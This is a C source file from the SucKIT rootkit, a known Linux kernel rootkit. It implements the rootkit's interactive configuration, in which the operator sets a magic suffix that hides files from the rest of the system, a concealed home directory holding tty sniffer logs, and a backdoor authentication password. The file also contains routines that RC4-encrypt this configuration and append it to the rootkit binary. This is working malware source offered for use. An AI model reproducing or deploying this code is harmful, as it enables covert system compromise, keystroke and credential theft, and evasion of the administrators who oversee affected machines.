/*
 * $Id: config.c, self-configuring stuff
 */

/* configuration stuff is encrypted ? */
#define	CONFIG_RC4 1

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

#include "sktypes.h"
#include "config.h"
#include "magic.h"
#include "rc4.h"
#include "aux.h"
#include "sha1.h"
#include "sk.h"
#include "getpw.h"

static int input(char *what, char *val, int max)
{
	char	buf[1024];

	eprintf("\e[1;37m%s \e[0m[%s]: ", what, val);
	fflush(stderr);
	fgets(buf, max, stdin);
	putc('\n', stderr);
	if (strlen(buf) < 2)
		return 0;
	strncpy(val, buf, max);
	val[strlen(buf)-1] = 0;
	return strlen(val);
}

int	is_same(char *f1, char *f2)
{
	struct	stat st1, st2;

	if (stat(f1, &st1) || stat(f2, &st2))
		return 0;
	return ((st1.st_dev == st2.st_dev) && (st1.st_ino == st2.st_ino));
}

int	configure(char *f, struct config *c)
{
	int	first = 0;
	char	buf[512];

	if (!c->hidestr[0])
		first++;

	if (first) {
		eprintf( "%s\n"
			"You have not configured suckit yet. Now I'll ask\n"
			"you few important questions, next time you can change\n"
			"configuration by running `%s C`\n\n", BANNER, f);
	}

	if (authenticated() && (is_same(f, strcat(get_khome(), "/sk")))) {
		eprintf(
		"WARNING: This file (%s) is actually used by currently\n"
		"running installation of suckit. Changing it's configuration\n"
		"without re-installation is not so good idea. Create a separate\n"
		"copy of this file and then you can config it.\n", f);
		return 1;
	}

	eprintf(
		"Suckit hides files containing magic string in their suffix\n"
		"Example: with suffix 'iamsoelite' the 'myfileiamsoelit' or\n"
		"'myfile.iamsoelite' files will not be shown to the rest of\n"
		"the system\n");
	do {
		input("Magic file-hiding suffix", c->hidestr, sizeof(c->hidestr));
		if (!c->hidestr[0]) {
			eprintf("Huh?!\n");
			continue;
		}
		if (strchr(c->hidestr, '/')) {
			eprintf("Having a path delimiter (/) is not good idea!\n");
			continue;
		}
		break;
	} while (1);
	eprintf(
		"Home directory will be your directory for logins. It will\n"
		"also contain .sniffer file with tty sniffer logs.\n"
		"It's name should have hide string as suffix, thus it will\n"
		"be hidden for the rest of system too.\n"
		"Example: for hiding-suffix equal to '%s' you could have\n"
		"something like /usr/share/man/man1/.%s\n", c->hidestr, c->hidestr);
	do {
		input("Home directory", c->home, sizeof(c->home));
		if (c->home[0] != '/') {
			eprintf("Your home directory _must_ be at absolute path!\n");
			continue;
		}
		break;
	} while (1);

	eprintf(
		"Suckit password is used for authentication of remote/local\n"
		"user. Please use at least 4 characters.\n");
	if (!first) {
		eprintf("Hit enter to keep previous password\n");
	}
	do {
		strcpy(buf, getpassw("\e[1;37mPassword\e[0m: "));
		if ((!buf[0]) && (!first))
			goto oldpass;
		if (strlen(buf) < 4) {
			eprintf("Way too short, ehh ?\n");
			continue;
		}
		if (strcmp(buf, getpassw("\e[1;37mRetype password\e[0m: "))) {
			eprintf("Sorry, password do not match!\n");
			continue;
		}
		break;
	} while (1);
	sha1_asm(c->hashpass, buf, strlen(buf));
oldpass:
	if (save_config(f, c)) {
		eprintf("Error saving configuration to %s\n", f);
		return 1;
	}
	eprintf("Configuration saved to %s\n", f);
	return 0;
}

/*
 * Load configuration from a file
 * returns -1 no config data found, -2 file error, 0 - ok
 */
int	load_config(char *f, struct config *c)
{
	int	fd, size;
	uchar	buf[CONF_MAGIC_SIZE];
	struct	config conf;
	rc4_ctx	ctx;

	fd = open(f, O_RDONLY);
	if (fd < 0)
		return -2;

	size = lseek(fd, 0, SEEK_END);
	if (size < 0) {
outta:
		close(fd);
		return -2;
	}

	if (lseek(fd, size - (sizeof(*c) + CONF_MAGIC_SIZE), SEEK_SET)
		!= (size - (sizeof(*c) + CONF_MAGIC_SIZE)))
		goto outta;

	if (read(fd, buf, CONF_MAGIC_SIZE) != CONF_MAGIC_SIZE)
		goto outta;

	if (memcmp(buf, CONFMAGIC, CONF_MAGIC_SIZE)) {
outta2:
		close(fd);
		return -1;
	}

	if (read(fd, &conf, sizeof(conf)) != sizeof(conf))
		goto outta2;

#if CONFIG_RC4
	rc4_init(CONFKEY, CONF_KEY_SIZE, &ctx);
	rc4((char *) &conf, sizeof(conf), &ctx);
#endif

	if (conf.home[0] != '/')
		goto outta;

	memcpy(c, &conf, sizeof(conf));
	close(fd);
	return 0;
}

/*
 * Saves configuration to file
 * returns -1 on file error, 0 - ok
 */
int	save_config(char *f, struct config *c)
{
	char	tmp[1024];
	char	*buf;
	int	fd, size;
	struct	config conf;
	rc4_ctx	ctx;

	fd = open(f, O_RDONLY);
	if (fd < 0)
		return -1;
	size = lseek(fd, 0, SEEK_END);
	if (size < 0) {
outta:
		close(fd);
		return -1;
	}
	if (lseek(fd, size - (sizeof(*c) + CONF_MAGIC_SIZE), SEEK_SET)
		!= (size - (sizeof(*c) + CONF_MAGIC_SIZE)))
		goto outta;
	if (read(fd, tmp, CONF_MAGIC_SIZE) != CONF_MAGIC_SIZE)
		goto outta;
	if (!memcmp(tmp, CONFMAGIC, CONF_MAGIC_SIZE))
		size -= (sizeof(*c) + CONF_MAGIC_SIZE);

	buf = malloc(size);
	if (!buf)
		goto outta;

	lseek(fd, 0, SEEK_SET);
	if (read(fd, buf, size) != size) {
		free(buf);
		goto outta;
	}
	close(fd);

	snprintf(tmp, sizeof(tmp), "%s.tmp", f);
	tmp[sizeof(tmp)-1] = 0;
	fd = creat(tmp, 0700);
	if (fd < 0) {
outta2:
		free(buf);
		return -1;
	}
	if (write(fd, buf, size) != size) {
outta3:
		close(fd);
		unlink(tmp);
		goto outta2;
	}
	if (write(fd, CONFMAGIC, CONF_MAGIC_SIZE) != CONF_MAGIC_SIZE)
		goto outta3;
	memcpy(&conf, c, sizeof(conf));
#if CONFIG_RC4
	rc4_init(CONFKEY, CONF_KEY_SIZE, &ctx);
	rc4((char *) &conf, sizeof(conf), &ctx);
#endif
	if (write(fd, &conf, sizeof(conf)) != sizeof(conf))
		goto outta3;
	if (unlink(f))
		goto outta3;
	free(buf);
	close(fd);
	return rename(tmp, f);
}
